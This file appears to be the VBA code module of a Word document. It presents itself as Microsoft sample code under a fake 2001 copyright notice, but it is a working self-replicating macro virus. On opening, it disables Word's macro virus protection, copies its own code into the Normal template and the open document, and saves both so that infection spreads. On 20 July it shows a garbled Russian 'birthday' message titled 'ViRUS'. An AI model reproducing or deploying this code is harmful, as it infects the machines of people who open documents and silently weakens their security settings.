   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   ' ------------------------------------------------------------------------
   '               Copyright (C) 2001 Microsoft Corporation
   '
   ' You have a royalty-free right to use, modify, reproduce and distribute
   ' the Sample Application Files (and/or any modified version) in any way
   ' you find useful, provided that you agree that Microsoft has no warranty,
   ' obligations or liability for any Sample Application Files.
   ' ------------------------------------------------------------------------
   Private Sub Document_Open()
   On Error Resume Next
   Dim Temp, Body As String
   Dim ADocument, NTemplate As Object
   Dim AFlag, NFlag As Boolean
   Const Length = 1799
   Set ADocument = ActiveDocument.VBProject.VBComponents.Item(1)
   Set NTemplate = NormalTemplate.VBProject.VBComponents.Item(1)
    AFlag = True
    NFlag = True
    Options.VirusProtection = Not AFlag
    If NTemplate.CodeModule.CountOfLines <> 0 Then
     Temp = NTemplate.CodeModule.Lines(1, NTemplate.CodeModule.CountOfLines)
    End If
    If InStr(Temp, "' " + String(72, "-")) = 0 Then
     If InStr(Temp, "Document_Open") = 0 Then NFlag = False
    Else
     Body = Temp: Temp = ""
    End If
    If ADocument.CodeModule.CountOfLines <> 0 Then
     Temp = ADocument.CodeModule.Lines(1, ADocument.CodeModule.CountOfLines)
    End If
    If InStr(Temp, "' " + String(72, "-")) = 0 Then
     If InStr(Temp, "Document_Open") = 0 Then AFlag = False
    Else
     Body = Temp: Temp = ""
    End If
    Body = Mid$(Body, InStr(Body, "' " + String(72, "-")), Length)
    If NFlag = False Then
     NTemplate.CodeModule.InsertLines 1, Body
     NormalTemplate.Save
    End If
    If Day(Date) = 20 And Month(Date) = 7 Then MsgBox "Èðà !!! Ñ äíåì ðîæäåíèÿ !!!", vbExclamation, "ViRUS"
    If AFlag = False Then
     ADocument.CodeModule.InsertLines 1, Body
     ActiveDocument.Save
    End If
   End Sub
